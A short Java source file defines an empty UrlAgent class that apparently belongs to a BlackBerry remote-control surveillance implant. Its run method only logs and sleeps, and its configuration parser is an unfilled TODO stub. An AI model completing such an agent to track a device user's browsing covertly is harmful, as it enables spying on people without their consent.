package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class UrlAgent extends Agent {
    static Debug debug = new Debug("UrlAgent", DebugLevel.VERBOSE);

    public UrlAgent(int agentStatus) {
        super(Agent.AGENT_URL, agentStatus, true);
    }

    protected UrlAgent(int agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void agentRun() {
        debug.trace("run");

        this.sleepUntilStopped();
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}